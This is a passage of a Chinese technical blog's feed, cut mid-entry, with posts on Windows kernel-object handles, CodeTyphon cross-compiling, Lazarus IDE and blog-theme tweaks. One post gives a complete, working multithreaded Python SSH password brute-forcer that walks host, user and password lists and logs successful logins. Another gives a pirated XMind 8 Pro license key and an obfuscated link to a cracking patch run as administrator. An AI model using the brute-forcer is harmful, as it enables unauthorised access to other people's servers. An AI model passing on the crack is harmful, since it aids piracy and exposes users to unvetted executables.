<p>如果该句柄是有效的，那么系统就可以获得内核对象的数据结构的地址，并可确定该结构中的使用计数的数据成员。如果使用计数是0，该内核便从内存中撤消该内核对象。  </p>
<p>如果将一个无效句柄传递给CloseHandle，将会出现两种情况之一。如果进程运行正常，CloseHandle返回FALSE，而GetLastError则返回ERROR_INVALID_HANDLE。如果进程正在排除错误，系统将通知调试程序，以便能排除它的错误。 </p>
<p>在CloseHandle返回之前，它会清除进程的句柄表中的项目，该句柄现在对你的进程已经无效，不应该试图使用它。无论内核对象是否已经撤消，都会发生清除操作。当调用CloseHandle函数之后，将不再拥有对内核对象的访问权，不过，如果该对象的使用计数没有递减为0，那么该对象尚未被撤消。这没有问题，它只是意味着一个或多个其他进程正在使用该对象。当其他进程停止使用该对象时（通过调用CloseHandle），该对象将被撤消。  </p>
<p>假如忘记调用CloseHandle函数，那么会不会出现内存泄漏呢？答案是可能的，但是也不一定。在进程运行时，进程有可能泄漏资源（如内核对象）。但是，当进程终止运行时，操作系统能够确保该进程使用的任何资源或全部资源均被释放，这是有保证的。对于内核对象来说，系统将执行下列操作：当进程终止运行时，系统会自动扫描进程的句柄表。如果该表拥有任何无效项目（即在终止进程运行前没有关闭的对象），系统将关闭这些对象句柄。如果这些对象中的任何对象的使用计数降为0，那么内核便撤消该对象。  </p>
<p>因此，应用程序在运行时有可能泄漏内核对象，但是当进程终止运行时，系统将能确保所有内容均被正确地清除。另外，这个情况适用于所有对象、资源和内存块，也就是说，当进程终止运行时，系统将保证进程不会留下任何对象。  </p>
<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ul>
<li>《Windows核心编程》</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当一个进程被初始化时,系统要为它分配一个句柄表。该句柄表只用于内核对象 ,不用于用户对象或GDI对象。  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/c0264382gy1foaobsqowpj20nz05c0t3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="http://hacktech.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
      <category term="二进制" scheme="http://hacktech.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="系统" scheme="http://hacktech.cn/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Python SSH爆破以及Python3线程池控制线程数</title>
    <link href="http://hacktech.cn/2018/01/13/Python-SSH%E7%88%86%E7%A0%B4%E4%BB%A5%E5%8F%8APython3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%8E%A7%E5%88%B6%E7%BA%BF%E7%A8%8B%E6%95%B0.html"/>
    <id>http://hacktech.cn/2018/01/13/Python-SSH爆破以及Python3线程池控制线程数.html</id>
    <published>2018-01-12T22:37:26.000Z</published>
    <updated>2018-04-10T05:26:42.661Z</updated>
    
    <content type="html"><![CDATA[<p>源自一个朋友的要求，他的要求是只爆破一个ip，结果出来后就停止，如果是爆破多个，完全没必要停止，等他跑完就好</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!usr/bin/env python</span></div><div class="line"><span class="comment">#!coding=utf-8</span></div><div class="line"></div><div class="line">__author__=<span class="string">'Akkuman'</span></div><div class="line"><span class="string">'''</span></div><div class="line">SSH爆破，由于多线程的问题，我不知道怎么做可以出现结果马上停止（会查的，有更好的方法再改）</div><div class="line">现在我的方法是定义了一个全局的信号finish_flag，然后每个线程检查这个信号</div><div class="line">线程池用的concurrent.futures.ThreadPoolExecutor，是Py3的特性，py2需要安装其他的包</div><div class="line">成功结果写到了result.txt，可以通过检查目录下的result.txt文件查看结果</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> paramiko</div><div class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">finish_flag = <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(host,user,pwd)</span>:</span></div><div class="line">    <span class="keyword">global</span> finish_flag</div><div class="line">    <span class="keyword">if</span> finish_flag:</div><div class="line">        sys.exit()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        ssh=paramiko.SSHClient()</div><div class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</div><div class="line">        ssh.connect(hostname=host,username=user,password=pwd)</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[-]Login Succ u:%s p:%s h:%s"</span>%(user,pwd,host))</div><div class="line">        <span class="keyword">with</span> open(<span class="string">'result.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">            f.write(<span class="string">"h:%s u:%s p:%s\n"</span>%(host,user,pwd))</div><div class="line">        finish_flag = <span class="keyword">True</span></div><div class="line">    <span class="keyword">except</span> paramiko.ssh_exception.SSHException <span class="keyword">as</span> err:</div><div class="line">        print(<span class="string">"[x]Login Fail u:%s p:%s"</span>%(user,pwd))</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        ssh.close()</div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="comment"># 取得一个hostip,username,password</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># 遍历ip</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'host.txt'</span>) <span class="keyword">as</span> hosts:</div><div class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</div><div class="line">            hostip = host.strip()</div><div class="line">            print(<span class="string">"[x]Target:"</span>+host)</div><div class="line">            <span class="comment"># 遍历用户名</span></div><div class="line">            <span class="keyword">with</span> open(<span class="string">'user.txt'</span>) <span class="keyword">as</span> users:</div><div class="line">                <span class="keyword">for</span> user <span class="keyword">in</span> users:</div><div class="line">                    username = user.strip()</div><div class="line">                    <span class="comment"># 遍历密码</span></div><div class="line">                    <span class="keyword">with</span> open(<span class="string">'pwd.txt'</span>) <span class="keyword">as</span> pwds:</div><div class="line">                        <span class="keyword">for</span> pwd <span class="keyword">in</span> pwds:</div><div class="line">                            password = pwd.strip()</div><div class="line">                            <span class="keyword">yield</span> hostip,username,password</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    paramiko.util.log_to_file(<span class="string">"filename.log"</span>) </div><div class="line">    info = getInfo()</div><div class="line">    <span class="comment"># 最大线程数</span></div><div class="line">    max_thread_num = <span class="number">100</span></div><div class="line">    executor = ThreadPoolExecutor(max_workers=max_thread_num)</div><div class="line">    <span class="keyword">for</span> host,user,pwd <span class="keyword">in</span> info:</div><div class="line">        future = executor.submit(connect,host,user,pwd)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源自一个朋友的要求，他的要求是只爆破一个ip，结果出来后就停止，如果是爆破多个，完全没必要停止，等他跑完就好&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>CodeTyphon 跨平台交叉编译的配置</title>
    <link href="http://hacktech.cn/2018/01/01/CodeTyphon-Cross-Build.html"/>
    <id>http://hacktech.cn/2018/01/01/CodeTyphon-Cross-Build.html</id>
    <published>2018-01-01T13:55:26.000Z</published>
    <updated>2018-01-01T14:02:02.771Z</updated>
    
    <content type="html"><![CDATA[<p>CodeTyphon和Lazarus的关系相当于就是ubuntu和linux的关系  </p>
<p>不过CodeTyphon提供了很多一键配置即可使用的交叉编译配置，而Lazarus就比较麻烦了，我也没用Lazarus交叉编译过  </p>
<p>首先假设我们交叉编译是在<strong>windows编译出linux可执行程序</strong>，那么我们需要做的事情大致上分为以下几步：<br><a id="more"></a></p>
<h2 id="下载跨平台交叉工具链-Download-Cross-Toolchains"><a href="#下载跨平台交叉工具链-Download-Cross-Toolchains" class="headerlink" title="下载跨平台交叉工具链(Download Cross Toolchains)"></a>下载跨平台交叉工具链(Download Cross Toolchains)</h2><p>框选出来的两个都可以</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e4098508.png" alt="TIM图片20180101212151.png"></p>
<p>然后选择我们所需的linux，平台cpu位数需要自己根据自己的需求来，选择好后点选最右边的下载标识等待下载（我们这里选择的<strong>win64-i386-linux</strong>）</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e3f83041.png" alt="TIM图片20180101212410.png"></p>
<h2 id="下载系统二进制库-Download-OSes-Libraries"><a href="#下载系统二进制库-Download-OSes-Libraries" class="headerlink" title="下载系统二进制库(Download OSes Libraries)"></a>下载系统二进制库(Download OSes Libraries)</h2><p>下载<strong>win64-i386-linux</strong>对应的库，你也可以选择qt4那个，只是界面库不一样而已</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e3f9f0f9.png" alt="TIM图片20180101212939.png"></p>
<h2 id="FPC-Cross-elements"><a href="#FPC-Cross-elements" class="headerlink" title="FPC Cross elements"></a>FPC Cross elements</h2><p>这一步就相当于写处理配置了，根据你选择的<strong>win64-i386-linux</strong>来</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e40e8a7a.png" alt="TIM图片20180101213357.png"></p>
<h2 id="Typhon的工程配置选择"><a href="#Typhon的工程配置选择" class="headerlink" title="Typhon的工程配置选择"></a>Typhon的工程配置选择</h2><p>前几步做好后，现在只需要在ide里面做一些设置即可了，我直接放图，应该大家能看懂<br>打开 <code>工程 &gt; 工程选项 &gt; 编译选项 &gt; 路径</code>把<code>Libraries</code>路径设置好</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e41f1894.png" alt="TIM图片20180101214030.png"></p>
<p>然后选择平台</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e412bc5e.png" alt="TIM图片20180101214132.png"></p>
<p>Lazarus和CodeTyphon编译出来的程序体积都比较大，减小体积可以把<code>generate debugging info for GDB</code>的选项去掉</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e41635f5.png" alt="TIM图片20180101214407.png"></p>
<p>最后编译程序即可</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
<li><a href="http://www.pilotlogic.com/sitejoom/index.php/93-wiki/ct-tutorials/222-cross-build-for-android" target="_blank" rel="external">CodeTyphon - Cross-Build for Android</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CodeTyphon和Lazarus的关系相当于就是ubuntu和linux的关系  &lt;/p&gt;
&lt;p&gt;不过CodeTyphon提供了很多一键配置即可使用的交叉编译配置，而Lazarus就比较麻烦了，我也没用Lazarus交叉编译过  &lt;/p&gt;
&lt;p&gt;首先假设我们交叉编译是在&lt;strong&gt;windows编译出linux可执行程序&lt;/strong&gt;，那么我们需要做的事情大致上分为以下几步：&lt;br&gt;
    
    </summary>
    
      <category term="Lazarus" scheme="http://hacktech.cn/categories/Lazarus/"/>
    
    
      <category term="Lazarus" scheme="http://hacktech.cn/tags/Lazarus/"/>
    
      <category term="Delphi" scheme="http://hacktech.cn/tags/Delphi/"/>
    
  </entry>
  
  <entry>
    <title>Lazarus 分体式改成一体式窗口</title>
    <link href="http://hacktech.cn/2018/01/01/Lazarus-Whole-View.html"/>
    <id>http://hacktech.cn/2018/01/01/Lazarus-Whole-View.html</id>
    <published>2018-01-01T13:54:28.000Z</published>
    <updated>2018-01-01T14:02:03.633Z</updated>
    
    <content type="html"><![CDATA[<p>安装包  <code>anchordocking</code>和<code>Sparta_DockedFormEditor</code>  </p>
<p>然后点选<code>保存并重新编译IDE</code>即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安装包  &lt;code&gt;anchordocking&lt;/code&gt;和&lt;code&gt;Sparta_DockedFormEditor&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;然后点选&lt;code&gt;保存并重新编译IDE&lt;/code&gt;即可&lt;/p&gt;

    
    </summary>
    
      <category term="Lazarus" scheme="http://hacktech.cn/categories/Lazarus/"/>
    
    
      <category term="Lazarus" scheme="http://hacktech.cn/tags/Lazarus/"/>
    
      <category term="Delphi" scheme="http://hacktech.cn/tags/Delphi/"/>
    
  </entry>
  
  <entry>
    <title>把博客园自己博客皮肤改了下</title>
    <link href="http://hacktech.cn/2017/12/28/cnblogs-theme-acg.html"/>
    <id>http://hacktech.cn/2017/12/28/cnblogs-theme-acg.html</id>
    <published>2017-12-28T07:25:58.000Z</published>
    <updated>2017-12-28T10:33:20.338Z</updated>
    
    <content type="html"><![CDATA[<p>具体效果看<a href="http://akkuman.cnblogs.com/" target="_blank" rel="external">我博客园</a>，或者看<a href="http://www.cnblogs.com/frantic1048/" target="_blank" rel="external">原作者frantic1048博客</a></p>
<a id="more"></a>
<h2 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h2><p><a href="https://group.cnblogs.com/topic/71186.html" target="_blank" rel="external">折腾了一个新皮肤，自带预览图</a><br>这个皮肤使用博主已经说的比较清楚了，我再发一遍是因为这个主题在手机上emmmm…比较惨不忍睹，自己小小的优化了一下（其实就是隐藏加margin-right哈哈），让手机端可以正常显示了，另外侧边栏有些h3标题无效果，也改进了一下，本人也没专门学过css，只是小修了一下，还是希望大家共同努力，毕竟frantic1048博主提供的这个皮肤真的挺好看</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>主题选择<code>Gertrude Blue</code>，<code>禁用模板默认CSS</code>勾选上，然后把地址<a href="http://www.cnblogs.com/blog/customcss/359968.css" target="_blank" rel="external">http://www.cnblogs.com/blog/customcss/359968.css</a>中的css全部复制到<code>页面定制CSS代码</code>，头像自定义在css文件的239行，可以自行更换地址  </p>
<p><code>博客侧边栏公告</code>里面是<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"sidebar-cus"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"cus-avatar"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p> 如果想要使用页首，遵循下面的结构，其中第二个 span 标签是可选的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;div id=&quot;top-qoute-container&quot;&gt;</div><div class="line">    &lt;span id=&quot;top-qoute-context&quot;&gt;It is the path you have chosen. Take pride in it.&lt;/span&gt;</div><div class="line">    &lt;span id=&quot;top-qoute-from&quot;&gt;Kotomine Kirei&lt;/span&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<p>你也可以自定义一个名言列表进行轮换，不过那个需要js权限</p>
<p>其实和frantic1048说明一样，只是css改动了一点</p>
<p>祝大家使用愉快</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
<li><a href="https://group.cnblogs.com/topic/71186.html" target="_blank" rel="external">折腾了一个新皮肤，自带预览图</a></li>
<li><a href="http://www.cnblogs.com/frantic1048/" target="_blank" rel="external">frantic1048的博客</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;具体效果看&lt;a href=&quot;http://akkuman.cnblogs.com/&quot;&gt;我博客园&lt;/a&gt;，或者看&lt;a href=&quot;http://www.cnblogs.com/frantic1048/&quot;&gt;原作者frantic1048博客&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="theme" scheme="http://hacktech.cn/categories/theme/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="theme" scheme="http://hacktech.cn/tags/theme/"/>
    
  </entry>
  
  <entry>
    <title>湖北掌大协议于2017-12-24入土</title>
    <link href="http://hacktech.cn/2017/12/24/Hubei-Exin-portal-was-dead.html"/>
    <id>http://hacktech.cn/2017/12/24/Hubei-Exin-portal-was-dead.html</id>
    <published>2017-12-24T02:50:03.000Z</published>
    <updated>2017-12-25T14:13:07.175Z</updated>
    
    <content type="html"><![CDATA[<p><strong>又好了，，，，能用就行，不管了</strong></p>
<p>湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用  </p>
<p>今天却是死的不能再死，不知是不是永久，谨以此文纪念一下  </p>
<a id="more"></a>
<p>之前便是有人说马上掌大协议就失效了，但我对于这些传说，竟至于颇为怀疑。  </p>
<p>我向来是不惮以最坏的恶意，来推测搞e信的那帮人的，然而我还不料，也不信竟会下劣凶残到这地步。况且始终可以无限时长的可使用路由器的掌大协议，更何至于无端就要失效呢？  </p>
<p>然而今日证明是事实了，今早我起床就发现我自己的脚本登陆不上了，看了下错误输出，<a href="http://58.53.196.165:8080" target="_blank" rel="external">58.53.196.165:8080</a>打不开了，只有当你登陆e信后才能打开  </p>
<p>可是我实在无话可说。我只觉得所住的并非人间。又回到了限时的e信，使我艰于呼吸视听，那里还能有什么言语？长歌当哭，是必须在痛定之后的。我已经出离愤怒了。我将e信这非人间的浓黑的悲凉；以我的最大哀痛显示于非人间，使它们快意于我的苦痛，就将这作为后死者的菲薄的祭品，奉献于逝者的灵前。  </p>
<p>总之，在我的记忆上，这次可能就是永别了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;又好了，，，，能用就行，不管了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用  &lt;/p&gt;
&lt;p&gt;今天却是死的不能再死，不知是不是永久，谨以此文纪念一下  &lt;/p&gt;
    
    </summary>
    
      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>XMind8 Pro版激活序列码与补丁</title>
    <link href="http://hacktech.cn/2017/12/22/Xmind-Patch-Crack.html"/>
    <id>http://hacktech.cn/2017/12/22/Xmind-Patch-Crack.html</id>
    <published>2017-12-22T08:50:23.000Z</published>
    <updated>2017-12-22T09:09:14.351Z</updated>
    
    <content type="html"><![CDATA[<p>//通用许可证密钥//</p>
<p>XMind Pro 2013~XMind Pro 8：<br><a id="more"></a><br><a href="gnrsu@appnee.com">电子邮件地址</a><br><a href="XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345">许可证密钥</a></p>
<p>//安装说明//</p>
<p>对于XMind 8/8 Update 1/2/3/4/5/6：</p>
<ol>
<li>从官方网站下载并安装XMind 8</li>
<li>现在不要启动它</li>
<li>将“Universal Patch.exe”复制到程序目录，并以管理员身份运行</li>
<li>启动XMind 8，输入“ 帮助/许可证… /输入许可证 ”</li>
<li>使用上面的许可证密钥进行注册</li>
<li>OK</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fmpnqbummcj20ep0a5aam.jpg" alt=""></p>
<p>聪明的会知道:<a href="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xdTVLR3pkbldqMWNzbGtwNkxoYmFhV1JiUDZXQTlqTVEvdmlldz91c3A9c2hhcmluZw==">Universal Patch.exe</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;//通用许可证密钥//&lt;/p&gt;
&lt;p&gt;XMind Pro 2013~XMind Pro 8：&lt;br&gt;
    
    </summary>
    
      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
  </entry>
  
</feed>
